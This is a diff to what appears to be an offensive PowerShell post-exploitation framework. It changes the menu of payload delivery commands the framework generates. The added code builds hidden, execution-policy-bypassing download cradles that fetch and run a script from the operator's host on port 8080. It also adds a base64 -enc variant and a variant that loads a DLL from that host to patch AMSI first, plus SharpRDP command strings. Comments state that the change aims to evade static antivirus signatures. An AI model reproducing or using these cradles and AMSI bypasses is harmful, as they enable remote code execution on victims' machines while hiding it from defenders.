@@ -3212,14 +3212,17 @@ while (`$true) {
 			$_liteConfig = @{} + $global:PayloadConfig
 			$_liteConfig.Amsi = 'none'; $_liteConfig.Etw = 'none'; $_liteConfig.Sbl = $false
 			$_servePS = (New-PayloadScript -ComputerName $ComputerName -PipeName $PipeName -Config $_liteConfig).InlinePS
-			$_srvCradle  = "iex(new-object net.webclient).downloadstring('http://$_srvIP`:8080/$_pipeFile')"
-			# [2] clean: no DLL — lite pipe script has no AMSI signatures, passes scanning unaided
-			$_srvCmdClean = "powershell -nop -ep bypass -w hidden -c `"$_srvCradle`""
-			# [3] DLL: Assembly.Load bypass before download — for envs where lite script needs pre-patching
+			$_serveURL   = "http://$_srvIP`:8080/$_pipeFile"
+			# [2] iwr: avoids iex/new-object/webclient/downloadstring static signatures
+			$_srvCmdIwr  = "powershell -nop -ep bypass -w hidden -c `"&([scriptblock]::Create((iwr '$_serveURL' -UseBasicParsing).Content))`""
+			# [3] enc: lite InlinePS base64-encoded — no network call, AMSI sees encoded data only
+			$_encB64     = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($_servePS))
+			$_srvCmdEnc  = "powershell.exe -nop -ep bypass -w hidden -enc $_encB64"
+			# [4] DLL: Assembly.Load pre-patches AMSI, then iwr-fetches lite script
 			if ($AmnesiacLoaderB64 -and $_alByp -and $_alPar) {
 				try { [System.IO.File]::WriteAllBytes((Join-Path $global:AmnesiacRoot $_dllFile), [Convert]::FromBase64String($AmnesiacLoaderB64)) } catch {}
 				$_srvAmsi    = "`$_a=[Reflection.Assembly]::Load((New-Object Net.WebClient).DownloadData('http://$_srvIP`:8080/$_dllFile'));`$_a.GetType('$_alNs.$_alByp').GetMethod('$_alPar').Invoke(`$null,`$null)"
-				$_srvCmdDll  = "powershell -nop -ep bypass -w hidden -c `"$_srvAmsi;$_srvCradle`""
+				$_srvCmdDll  = "powershell -nop -ep bypass -w hidden -c `"$_srvAmsi;&([scriptblock]::Create((iwr '$_serveURL' -UseBasicParsing).Content))`""
 			} else {
 				$_srvCmdDll = $null
 			}
@@ -3230,20 +3233,24 @@ while (`$true) {
 			Write-Output " [1] Inline PS -- full bypass payload, paste into existing session:"
 			Write-Output " $($built.InlinePS)"
 			Write-Output ""
-			Write-Output " [2] Clean serve -- lite pipe script (no bypass code), AMSI-clean:"
-			Write-Output " $_srvCmdClean"
+			Write-Output " [2] IWR serve -- iwr+scriptblock, no iex/webclient/downloadstring:"
+			Write-Output " $_srvCmdIwr"
+			Write-Output ""
+			Write-Output " [3] Enc serve -- base64-encoded lite script, no network call, no iex:"
+			Write-Output " $_srvCmdEnc"
 			Write-Output ""
 			if ($_srvCmdDll) {
-				Write-Output " [3] DLL serve -- Assembly.Load pre-patches AMSI, then serves lite script:"
+				Write-Output " [4] DLL serve -- Assembly.Load pre-patches AMSI, then iwr-fetches lite script:"
 				Write-Output " $_srvCmdDll"
 				Write-Output ""
 			}
-			if (-not $_serveOk) { Write-Host " [!] serve not running -- run 'serve' in local shell before using option 2/3" -ForegroundColor Red }
-			Write-Host " Copy to clipboard [1] Inline PS  [2] Clean serve  [3] DLL serve: " -ForegroundColor Yellow -NoNewline
+			if (-not $_serveOk) { Write-Host " [!] serve not running -- run 'serve' in local shell before using option 2/4" -ForegroundColor Red }
+			Write-Host " Copy to clipboard [1] Inline PS  [2] IWR serve  [3] Enc  [4] DLL serve: " -ForegroundColor Yellow -NoNewline
 			$_sc = (Read-Host).Trim()
 			$_clipPayload = switch ($_sc) {
-				'2' { $_srvCmdClean }
-				'3' { if ($_srvCmdDll) { $_srvCmdDll } else { $_srvCmdClean } }
+				'2' { $_srvCmdIwr }
+				'3' { $_srvCmdEnc }
+				'4' { if ($_srvCmdDll) { $_srvCmdDll } else { $_srvCmdIwr } }
 				default { $built.InlinePS }
 			}
 		}
@@ -3477,18 +3484,21 @@ while (`$true) {
 		$_liteConfig = @{} + $global:PayloadConfig
 		$_liteConfig.Amsi = 'none'; $_liteConfig.Etw = 'none'; $_liteConfig.Sbl = $false
 		$_servePS = (New-PayloadScript -IsServer -PipeName $PN -SID $stealthSID -Config $_liteConfig).InlinePS
-		$_rdpCradle    = "iex(new-object net.webclient).downloadstring('http://$_operatorIP`:8080/$_pipeFile')"
-		# [2] clean: no DLL — lite pipe script has no AMSI signatures, passes unaided
-		$_srvCmdClean  = "powershell -nop -ep bypass -w hidden -c `"$_rdpCradle`""
-		# [3] DLL: Assembly.Load pre-patches AMSI, then serves lite script
+		$_serveURL     = "http://$_operatorIP`:8080/$_pipeFile"
+		# [2] iwr: avoids iex/new-object/webclient/downloadstring static signatures
+		$_srvCmdIwr    = "powershell -nop -ep bypass -w hidden -c `"&([scriptblock]::Create((iwr '$_serveURL' -UseBasicParsing).Content))`""
+		# [3] enc: lite InlinePS base64-encoded — no network call, AMSI sees encoded data only
+		$_encB64       = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($_servePS))
+		$_srvCmdEnc    = "powershell.exe -nop -ep bypass -w hidden -enc $_encB64"
+		# [4] DLL: Assembly.Load pre-patches AMSI, then iwr-fetches lite script
 		if ($AmnesiacLoaderB64 -and $_alByp -and $_alPar) {
 			try { [System.IO.File]::WriteAllBytes((Join-Path $global:AmnesiacRoot $_dllFile), [Convert]::FromBase64String($AmnesiacLoaderB64)) } catch {}
 			$_rdpAmsi    = "`$_a=[Reflection.Assembly]::Load((New-Object Net.WebClient).DownloadData('http://$_operatorIP`:8080/$_dllFile'));`$_a.GetType('$_alNs.$_alByp').GetMethod('$_alPar').Invoke(`$null,`$null)"
-			$_srvCmdDll  = "powershell -nop -ep bypass -w hidden -c `"$_rdpAmsi;$_rdpCradle`""
-			$_sharpRDPCmd = "command=powershell -nop -ep bypass -w hidden -c `"$_rdpAmsi;$_rdpCradle`""
+			$_srvCmdDll  = "powershell -nop -ep bypass -w hidden -c `"$_rdpAmsi;&([scriptblock]::Create((iwr '$_serveURL' -UseBasicParsing).Content))`""
+			$_sharpRDPCmd = "command=powershell -nop -ep bypass -w hidden -c `"$_rdpAmsi;&([scriptblock]::Create((iwr '$_serveURL' -UseBasicParsing).Content))`""
 		} else {
 			$_srvCmdDll   = $null
-			$_sharpRDPCmd = "command=powershell -nop -ep bypass -w hidden -c `"$_rdpCradle`""
+			$_sharpRDPCmd = "command=powershell -nop -ep bypass -w hidden -c `"&([scriptblock]::Create((iwr '$_serveURL' -UseBasicParsing).Content))`""
 		}
 		# Write pipe file to disk for serve-based delivery and SharpRDP last-resort.
 		# winrm delivery uses $global:LastInlinePS directly — no serve or disk file needed.
@@ -3501,20 +3511,24 @@ while (`$true) {
 		Write-Output " [1] Inline PS -- full bypass payload, paste into existing session:"
 		Write-Output " $($built.InlinePS)"
 		Write-Output ""
-		Write-Output " [2] Clean serve -- lite pipe script (no bypass code), AMSI-clean:"
-		Write-Output " $_srvCmdClean"
+		Write-Output " [2] IWR serve -- iwr+scriptblock, no iex/webclient/downloadstring:"
+		Write-Output " $_srvCmdIwr"
+		Write-Output ""
+		Write-Output " [3] Enc serve -- base64-encoded lite script, no network call, no iex:"
+		Write-Output " $_srvCmdEnc"
 		Write-Output ""
 		if ($_srvCmdDll) {
-			Write-Output " [3] DLL serve -- Assembly.Load pre-patches AMSI, then serves lite script:"
+			Write-Output " [4] DLL serve -- Assembly.Load pre-patches AMSI, then iwr-fetches lite script:"
 			Write-Output " $_srvCmdDll"
 			Write-Output ""
 		}
-		if (-not $_serveOk) { Write-Host " [!] serve not running -- run 'serve' in local shell before using option 2/3" -ForegroundColor Red }
-		Write-Host " Copy to clipboard [1] Inline PS  [2] Clean serve  [3] DLL serve: " -ForegroundColor Yellow -NoNewline
+		if (-not $_serveOk) { Write-Host " [!] serve not running -- run 'serve' in local shell before using option 2/4" -ForegroundColor Red }
+		Write-Host " Copy to clipboard [1] Inline PS  [2] IWR serve  [3] Enc  [4] DLL serve: " -ForegroundColor Yellow -NoNewline
 		$_sc = (Read-Host).Trim()
 		$_clipPayload = switch ($_sc) {
-			'2' { $_srvCmdClean }
-			'3' { if ($_srvCmdDll) { $_srvCmdDll } else { $_srvCmdClean } }
+			'2' { $_srvCmdIwr }
+			'3' { $_srvCmdEnc }
+			'4' { if ($_srvCmdDll) { $_srvCmdDll } else { $_srvCmdIwr } }
 			default { $built.InlinePS }
 		}
 	}
